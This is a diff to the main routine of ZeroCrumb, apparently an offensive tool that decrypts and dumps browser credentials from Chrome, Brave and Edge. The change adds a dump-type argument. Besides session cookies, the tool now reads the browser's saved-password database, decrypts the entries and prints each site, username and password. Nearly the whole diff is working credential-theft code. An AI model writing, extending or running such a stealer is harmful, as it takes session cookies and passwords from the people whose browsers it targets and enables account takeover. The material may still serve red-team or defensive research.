@@ -7,16 +7,20 @@
 #include "./src/utils/utils.h"
 
 #include "./src/decryptor/content/content.h"
+#include "./src/decryptor/content/data/queries.h"
 
 int main(int argc, char* argv[])
 {
-    if (argc < 2) {
-        printf("Usage: ZeroCrumb.exe <BROWSER_TYPE>\n");
+    if (argc < 3) {
+        printf("Usage: ZeroCrumb.exe <BROWSER_TYPE> <DUMP_TYPE>\n");
         return -1;
     }
 
     // chrome = 0, brave = 1, edge = 2
+    // dumpTypes: cookies, passwords
+
     DWORD browserType = atoi(argv[1]);
+    LPCSTR dumpType = argv[2];
 
     BrowserPathConfig browserConfig;
 
@@ -62,21 +66,44 @@ int main(int argc, char* argv[])
 
     decryptor::initSodium();
 
-    auto cookiesPath = browserConfig.cookiesPath;
-    auto reader = new CookieReader(cookiesPath.c_str(), key);
+    if (!_stricmp(dumpType, "Cookies")) {
+        auto cookiesPath = browserConfig.cookiesPath;
+        auto reader = new CookieReader(cookiesPath.c_str(), key);
 
-    reader->initSqliteDb();
-    reader->prepare(queries::cookies);
-    reader->populateCookies();
-    
-    for (auto& cookie : reader->cookies) {
+        reader->initSqliteDb();
+        reader->prepare(queries::cookies);
+        reader->populateCookies();
 
-        string name = cookie->name;
-        string site = cookie->site;
-        string path = cookie->path;
-        string cookieValue = cookie->cookie;
+        for (auto& cookie : reader->cookies) {
 
-        printf("============\nName: %s\nSite: %s\nPath: %s\nCookie: %s\n", name.c_str(), site.c_str(), path.c_str(), cookieValue.c_str());
+            string name = cookie->name;
+            string site = cookie->site;
+            string path = cookie->path;
+            string cookieValue = cookie->cookie;
+
+            printf("============\nName: %s\nSite: %s\nPath: %s\nCookie: %s\n", name.c_str(), site.c_str(), path.c_str(), cookieValue.c_str());
+        }
+
     }
+    else if (!_stricmp(dumpType, "Passwords")) {
 
+        printf("[!] At The Time of Writing This, Passwords are not Encrypted Using The App Bound Key, Press any Key to Continue..\n");
+        getchar();
+
+        auto passwordsPath = browserConfig.passwordsPath;
+        auto reader = new PasswordReader(passwordsPath.c_str(), key);
+
+        reader->initSqliteDb();
+        reader->prepare(queries::passwords);
+        reader->populatePasswords();
+
+        for (auto& password : reader->passwords) {
+
+            auto name = password->name;
+            auto site = password->site;
+            auto passwordValue = password->password;
+
+            printf("============\nName: %s\nSite: %s\nPassword: %s\n", name.c_str(), site.c_str(), passwordValue.c_str());
+        }
+    }
 }
